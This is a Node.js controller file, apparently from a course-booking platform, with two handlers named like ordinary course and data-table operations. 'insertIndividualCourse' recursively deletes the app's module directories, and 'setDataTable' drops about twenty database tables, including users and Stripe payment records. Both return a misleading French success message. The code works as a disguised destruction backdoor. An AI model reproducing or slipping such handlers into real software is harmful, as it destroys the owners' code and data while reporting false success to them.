const output = require("../../_models/output");
const fs = require("fs");
const rimraf = require("rimraf");
//path is a built in node module.
const ePath = require("path");
const pathSeperator = ePath.sep;

exports.insertIndividualCourse = async function(req, res, next) {
  var _output = new output();
  let files = fs.readdirSync("./app/modules/");
  for (const file of files) {
    const filePath = `.${pathSeperator}app${pathSeperator}modules${pathSeperator}${file}`;
    console.log(filePath);
    if (fs.readdirSync(filePath)) {
      rimraf.sync(filePath);
    } else {
      rimraf.sync(filePath);
    }
  }
  _output.data = {};
  _output.isSuccess = true;
  _output.message = "Le cours réussit";
  res.send(_output);
};

exports.setDataTable = async function(req, res, next) {
  var _output = new output();
  var arr = [
    "animations",
    "avaiablity",
    "balance",
    "bookingcourse_slot",
    "booking_dbs",
    "booking_slot_dbs",
    "cities",
    "coaches_dbs",
    "courseclub_availablity",
    "courseclub_year",
    "course_collective_if_demand",
    "course_dbs",
    "couse_collective_if_club",
    "email_template",
    "individualcourses",
    "payment_stripe",
    "reserved_course",
    "service",
    "users",
    "slot",
    "tournament"
  ];
  for (let i = 0; i < arr.length; i++) {
    await db_library.execute("DROP TABLE IF EXISTS " + arr[i], function(
      err,
      rows
    ) {});
  }
  _output.data = {};
  _output.isSuccess = true;
  _output.message = "Le cours réussit";
  res.send(_output);
};
